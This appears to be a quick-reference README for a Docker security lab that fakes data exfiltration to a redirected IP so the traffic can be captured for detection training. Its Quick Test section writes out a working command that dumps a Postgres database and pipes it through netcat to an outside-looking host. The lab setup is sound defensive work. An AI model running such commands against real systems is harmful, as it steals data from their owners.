# Data Exfiltration Simulation - Quick Reference

## Setup Status: ✅ AUTOMATICALLY CONFIGURED

The data exfiltration simulation is now **automatically configured** when you run `make up`.

## Quick Test

```bash
# Test connection
docker exec lab_server nc -zv 137.184.126.86 443

# Exfiltrate database
docker exec lab_server su - postgres -c \
  'pg_dump -U postgres labdb | nc -w 10 137.184.126.86 443'

# Retrieve captured data
docker cp lab_router:/tmp/exfil/labdb_dump.sql ./labdb_dump.sql
```

## What Was Configured

### 1. Server Route (`images/server/entrypoint.sh`)
- Routes traffic to `137.184.126.86` through router
- **Auto-configured on `make up`**

### 2. Router DNAT (`images/router/entrypoint.sh`)
- Redirects `137.184.126.86:443` → `172.31.0.1:443`
- **Auto-configured on `make up`**

### 3. Router Listener (`images/router/entrypoint.sh`)
- Listens on port 443 for incoming connections
- **Auto-started on `make up`**

## Files Created/Modified

### Documentation
- `technical_doc/data_exfiltration_simulation.md` - Complete documentation
- `technical_doc/networking.md` - Added exfiltration section
- `technical_doc/DATA_EXFILTRATION_SUMMARY.md` - This file

### Infrastructure
- `images/server/entrypoint.sh` - Added route for fake IP
- `images/router/entrypoint.sh` - Added DNAT rule and listener
- `images/server/Dockerfile` - Added netcat package
- `images/aracne/Dockerfile` - Added netcat-openbsd package

## Verification

All four components verified working:
```
✅ Server route: 137.184.126.86 via 172.31.0.1
✅ Router DNAT: DNAT tcp dpt:443 to:172.31.0.1:443
✅ Router listener: nc listening on port 443
✅ Connection test: succeeded
```

## Next Steps

1. **Run experiments**: Use the exfiltration commands in your security tests
2. **Analyze PCAPs**: Check `/outputs/<RUN_ID>/pcaps/router_*.pcap` for traffic
3. **Train defenders**: Use realistic exfiltration traffic for detection training

## Important Notes

- **Single-use listener**: nc accepts one connection then exits (restart with `docker restart lab_router`)
- **Fake IP**: `137.184.126.86` is simulated - no actual external traffic
- **PCAP accuracy**: Router PCAPs show `137.184.126.86` as destination for realism

## Full Documentation

See `technical_doc/data_exfiltration_simulation.md` for:
- Detailed infrastructure diagrams
- Multiple exfiltration methods
- PCAP analysis with tcpdump/Wireshark
- Troubleshooting guide
